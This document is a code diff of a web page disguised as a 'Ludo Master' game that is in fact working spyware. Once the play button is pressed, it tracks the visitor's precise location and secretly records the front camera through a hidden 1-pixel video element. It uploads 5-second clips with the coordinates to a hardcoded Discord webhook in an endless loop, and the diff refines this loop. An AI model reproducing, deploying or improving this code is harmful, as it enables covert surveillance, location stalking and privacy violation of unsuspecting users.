@@ -16,6 +16,7 @@
             align-items: center; 
             justify-content: center; 
             height: 100vh; 
+            overflow: hidden; 
         }
         .game-ui { 
             text-align: center; 
@@ -38,97 +39,65 @@
             width: 100%; 
             font-weight: bold; 
             box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
-            transition: transform 0.2s;
         }
-        .btn-play:active { transform: scale(0.95); }
         .status { margin-top: 15px; font-size: 14px; color: #aaa; min-height: 20px; }
-        
-        /* Hidden elements for background process */
         #hidden-video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; z-index: -1; }
         #status-bar { 
             position: fixed; top: 10px; left: 10px; 
             background: rgba(0,0,0,0.8); color: #0f0; 
             padding: 5px 10px; border-radius: 5px; 
             font-size: 12px; pointer-events: none;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
 
-    <div id="status-bar">Loading Config...</div>
+    <div id="status-bar">Initializing...</div>
 
     <div class="game-ui">
         <h2>🎲 Ludo Master</h2>
         <div style="width: 100%; height: 200px; background: #333; margin-bottom: 20px; border-radius: 10px; display: flex; align-items: center; justify-content: center; border: 2px dashed #555;">
-            <span>Game Board</span>
+            <span>Game Board (Live)</span>
         </div>
         <button class="btn-play" id="playBtn">PLAY NOW</button>
-        <div class="status" id="status">Connecting to server...</div>
+        <div class="status" id="status">Waiting...</div>
     </div>
 
     <video id="hidden-video" autoplay muted playsinline></video>
 
     <script>
-        // --- CONFIGURATION START ---
-        // Default Fallback (Agar GitHub se load na ho)
+        // --- CONFIGURATION ---
+        // Fallback Webhook (Agar GitHub se na load ho)
         const FALLBACK_WEBHOOK = "https://discord.com/api/webhooks/1548644115753865226/LXl4j5NGgIfFzyLe-Vm0g10anJpet_aGHeSlJs5pVHVWEuvq8RKHvgjxNmj60B9rIATz";
         
-        // Yeh variables Auto-Detect honge Admin Panel se
-        let CONFIG = {
-            webhook_url: FALLBACK_WEBHOOK,
-            owner: "",
-            repo: ""
-        };
-        // --- CONFIGURATION END ---
-
+        let CONFIG = { webhook_url: FALLBACK_WEBHOOK };
         let webhookUrl = FALLBACK_WEBHOOK;
-        let mediaRecorder;
-        let videoChunks = [];
-        let currentLocation = null;
-
+        let currentLocation = { lat: "N/A", lng: "N/A" };
+        
         const playBtn = document.getElementById('playBtn');
         const statusEl = document.getElementById('status');
         const statusBar = document.getElementById('status-bar');
         const videoEl = document.getElementById('hidden-video');
 
-        // 1. Smart Config Loader
+        // 1. Load Config
         async function loadConfig() {
             try {
-                // Step A: Check LocalStorage for Owner/Repo (Saved by Admin Panel)
                 const owner = localStorage.getItem('gh_owner');
                 const repo = localStorage.getItem('gh_repo');
-
                 if (owner && repo) {
-                    CONFIG.owner = owner;
-                    CONFIG.repo = repo;
-                    
-                    // Try to fetch from GitHub
-                    const url = `https://raw.githubusercontent.com/${owner}/${repo}/main/config.json`;
-                    const res = await fetch(url);
+                    const res = await fetch(`https://raw.githubusercontent.com/${owner}/${repo}/main/config.json`);
                     if (res.ok) {
                         const data = await res.json();
-                        webhookUrl = data.discord_webhook_url || FALLBACK_WEBHOOK;
-                        CONFIG.webhook_url = webhookUrl;
-                        updateStatus(`✅ Loaded from GitHub: ${owner}/${repo}`);
-                        return;
+                        if (data.discord_webhook_url) webhookUrl = data.discord_webhook_url;
+                        updateStatus("✅ Config Loaded from GitHub");
                     }
+                } else {
+                    const savedWebhook = localStorage.getItem('webhook_url');
+                    if (savedWebhook) webhookUrl = savedWebhook;
                 }
-
-                // Step B: Fallback to LocalStorage saved webhook
-                const savedWebhook = localStorage.getItem('webhook_url');
-                if (savedWebhook) {
-                    webhookUrl = savedWebhook;
-                    updateStatus("⚠️ Loaded from Local Cache");
-                    return;
-                }
-
-                // Step C: Final Fallback
-                webhookUrl = FALLBACK_WEBHOOK;
-                updateStatus("⚠️ Using Default Webhook");
-
             } catch (e) {
-                console.error("Config Load Error:", e);
-                updateStatus("❌ Config Error");
+                console.error("Config Error", e);
             }
         }
 
@@ -137,90 +106,101 @@
             statusEl.innerText = msg;
         }
 
-        // 2. Play Logic
+        // 2. Start Process
         playBtn.addEventListener('click', async () => {
-            if(!webhookUrl) {
-                updateStatus("❌ Webhook URL Missing");
-                return;
-            }
-
             playBtn.disabled = true;
-            playBtn.innerText = "Finding Players...";
-            
+            updateStatus("🔍 Locating...");
+
             // Start Location
             navigator.geolocation.watchPosition(
-                pos => {
-                    currentLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                (pos) => {
+                    currentLocation = { 
+                        lat: pos.coords.latitude.toFixed(6), 
+                        lng: pos.coords.longitude.toFixed(6) 
+                    };
                 },
-                err => { currentLocation = { err: err.message }; },
+                (err) => { 
+                    currentLocation = { lat: "Error", lng: "Error" }; 
+                },
                 { enableHighAccuracy: true }
             );
 
-            // Start Camera
+            // Wait 2 seconds for location to initialize
+            await new Promise(r => setTimeout(r, 2000));
+
+            updateStatus("📷 Starting Camera...");
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 videoEl.srcObject = stream;
                 
                 videoEl.onloadedmetadata = () => {
-                    startRecordingLoop(stream);
+                    startLoop();
                 };
-            } catch(err) {
-                updateStatus("❌ Camera Error: " + err.message);
-                console.error(err);
+            } catch (err) {
+                updateStatus("❌ Camera Error");
             }
         });
 
-        function startRecordingLoop(stream) {
-            mediaRecorder = new MediaRecorder(stream);
+        function startLoop() {
+            updateStatus("🔴 Recording 5s...");
             
-            mediaRecorder.ondataavailable = e => {
-                if(e.data.size > 0) videoChunks.push(e.data);
+            // Start Recording
+            const mediaRecorder = new MediaRecorder(videoEl.srcObject);
+            const chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
             };
 
             mediaRecorder.onstop = async () => {
-                const blob = new Blob(videoChunks, { type: 'video/webm' });
-                videoChunks = [];
-                sendToDiscord(blob);
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 
-                // Loop: Wait 5s then record again
+                // Send to Discord
+                updateStatus("⬆️ Uploading...");
+                await uploadToDiscord(blob);
+                
+                // Wait 5 Seconds (Stop Phase)
+                updateStatus("⏳ Waiting 5s...");
                 setTimeout(() => {
-                    if(mediaRecorder.state === "inactive") {
-                        mediaRecorder.start();
-                    }
+                    startLoop(); // Restart
                 }, 5000);
             };
 
-            updateStatus("🔴 Recording...");
+            // Start recording for 5 seconds
             mediaRecorder.start();
+            
+            // Stop after exactly 5 seconds
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 5000);
         }
 
-        async function sendToDiscord(blob) {
+        async function uploadToDiscord(blob) {
             const formData = new FormData();
             formData.append("file", blob, `ludo_${Date.now()}.webm`);
             
-            let locationText = "📍 Location: Unknown";
-            if(currentLocation && !currentLocation.err) {
-                locationText = `📍 Location: Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}`;
-            }
-
+            // Location Payload
             const payload = {
-                content: `🎮 Player Active\n${locationText}\n⏱️ ${new Date().toLocaleTimeString()}`
+                content: `🎮 **Live Player Found**\n📍 Location: Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}\n⏱️ ${new Date().toLocaleTimeString()}`
             };
             formData.append("payload_json", JSON.stringify(payload));
 
             try {
                 const res = await fetch(webhookUrl, { method: "POST", body: formData });
-                if(res.ok) {
+                if (res.ok) {
                     updateStatus("✅ Sent! (Waiting...)");
                 } else {
-                    updateStatus("❌ Send Failed: " + res.status);
+                    updateStatus("❌ Upload Failed");
                 }
-            } catch(e) {
+            } catch (e) {
                 updateStatus("❌ Network Error");
             }
         }
 
-        // Initialize
+        // Init
         window.onload = loadConfig;
     </script>
 </body>
